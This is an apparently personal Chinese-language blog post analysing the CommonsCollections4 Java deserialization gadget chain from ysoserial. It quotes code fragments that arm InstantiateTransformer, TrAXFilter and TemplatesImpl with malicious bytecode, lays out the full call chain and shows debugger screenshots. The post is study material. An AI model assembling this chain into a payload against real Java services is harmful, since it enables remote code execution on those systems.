<!DOCTYPE html>
<html lang="zh-CN">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="Xi4nb3i" />
  <meta name="description" content="" />
  
  
  <title>
    
      CommonsCollections4反序列化链分析 
      
      
    
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.svg">
    <link rel="icon" href="/images/favicon.svg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto:400,400italic,600|Roboto+Mono" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/css/common.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">


  

  
    
<link rel="stylesheet" href="/css/post.css">

  

  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Xi4nb3i's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <a href="/">Xi4nb3i</a>
</div>


      <p class="links">
  
    <a title="archives" target="" href="/archives/">
      <i class="iconfont icon-bookmark"></i>
    </a>
  
    <a title="github" target="_blank" href="https://github.com/xianbeil">
      <i class="iconfont icon-github"></i>
    </a>
  
    <a title="twitter" target="_blank" href="https://twitter.com/aeqaq0">
      <i class="iconfont icon-twitter"></i>
    </a>
  
</p>


      <div class="main">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
  MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']]
    }
  };
</script>

<div class="post">
  <h3 class="date">
    Apr 03, 2022
  </h3>
  <h1>
    CommonsCollections4反序列化链分析
  </h1>
  <div class="content markdown-body">
    <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文分析调试ysoserial中的CC4。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Variation on CommonsCollections2 that uses InstantiateTransformer instead of</span><br><span class="line"> * InvokerTransformer.</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>

<p>和CC2不同的是，CC4使用了<code>InstantiateTransformer</code>代替<code>InvokerTransformer</code></p>
<p>也就是说和CC3一样，都是用这个类来反射调用方法。所以CC4实际上是CC2+CC3</p>
<p>本篇也会对之前的内容多一点回顾与复习。</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdk1<span class="number">.7</span>+tomcat8+commons:commons-collections4:<span class="number">4.0</span></span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402232047-t45nbv4.png" alt="image.png"></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="Gadgets-createTemplatesImpl-command"><a href="#Gadgets-createTemplatesImpl-command" class="headerlink" title="Gadgets.createTemplatesImpl(command)"></a>Gadgets.createTemplatesImpl(command)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>

<p>构造并返回了一个包含了恶意字节码的TemplatesImpl对象，组建Templates攻击链。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constant</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br></pre></td></tr></table></figure>

<p>新建一个<code>ConstantTransformer</code>对象然后填充一个<code>String.class</code>占位。</p>
<h2 id="new-InstantiateTransformer"><a href="#new-InstantiateTransformer" class="headerlink" title="new InstantiateTransformer"></a>new InstantiateTransformer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line">Class[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;;</span><br><span class="line">Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">		paramTypes, args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// grab defensively copied arrays</span></span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402233557-oyg4jqy.png" alt="image.png"></p>
<p><code>InstantiateTransformer</code>类定义了一个<code>transform</code>方法，这是触发点。</p>
<p>通过getConstructor来拿到input类的参数类型为<code>this.iParamTypes</code>的构造方法，这里传入的为<code>paramTypes</code>为<code>String.class</code>。</p>
<p>然后通过newInstance来实例化对象，这里传入的args为一个foo字符占位。</p>
<p>用<code>Reflections.getFieldValue</code>拿到两个Field，为之后填充真实的payload做准备。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; constant, instantiate &#125;);</span><br></pre></td></tr></table></figure>

<p>将<code>InstantiateTransformer</code>和<code>ConstantTransformer</code>包含到<code>ChainedTransformer</code>里。</p>
<p>这样当触发<code>ChainedTransformer.transform()</code>的时候，就能够递归调用数组中的transform方法，也能触发最后<code>InstantiateTransformer.transform()</code>，至于传入的对象现在还没填充。</p>
<h2 id="new-PriorityQueue"><a href="#new-PriorityQueue" class="headerlink" title="new PriorityQueue"></a>new PriorityQueue</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402235204-mpqusn8.png" alt="image.png"></p>
<p>优先队列，这个可以去看cc2讲的很详细。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402235408-3oyqcr9.png" alt="image.png"></p>
<h2 id="反射赋值"><a href="#反射赋值" class="headerlink" title="反射赋值"></a>反射赋值</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// swap in values to arm</span></span><br><span class="line">Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>

<p>最后是ysoserial填充的时候，一般这个时候我们才能完全对链子了解。</p>
<p><code>TrAXFilter.class</code>被设置为<code>ConstantTransformer</code>的<code>iConstant</code>属性的值。</p>
<p>也就是<code>InstantiateTransformer.transform()</code>传入的input参数</p>
<p>加上下面的paramTypes和args的填充，基本上那个transform方法我们就能知道最后是咋搞得，主要是下面两句。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402235909-2djllj9.png" alt="image.png"></p>
<p>跟进到<code>TrAXFilter</code>的构造方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220403000315-42jmclb.png" alt="image.png"></p>
<p>这里传入的Templates对象就是我们构造的包含了恶意字节码的对象。</p>
<p><code>templates.newTransformer()</code>的时候，自动加载了静态块里的恶意代码，完成调用。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总之这条链子就是之前CC2和CC3的结合版，改动的地方不多，可以手写一下Gaget Chain看一下自己懂不懂逻辑hhh</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	PriorityQueue.readObject()</span><br><span class="line">		TransformingComparator.compare()</span><br><span class="line">			ConstantTransformer.transform()</span><br><span class="line">				InstantiateTransformer.transform()</span><br><span class="line">					TemplatesImpl.newTransformer()</span><br><span class="line">					加载静态块恶意代码</span><br></pre></td></tr></table></figure>


<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>断点打在：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220403001436-i6ptn11.png" alt="image.png"></p>
<p>完整方法栈，可以看到我们的TemplatesImpl对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220403001723-s3h5ol8.png" alt="image.png"></p>

  </div>
  
    
      <a id="older" class="blog-nav" href="/2022/03/31/ctfshow%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/">OLDER&nbsp;&gt;</a>
      
        
          <a id="newer" class="blog-nav" href="/2022/04/04/cc%E6%80%BB%E7%BB%93/">&lt;&nbsp;NEWER</a>
          
            
</div>
        <div class="footer">
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Copyright © Leedom 2021</a>
        
    </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Theme by Leedom | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="back-to-top hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



      


    </div>
  </body>
</html>
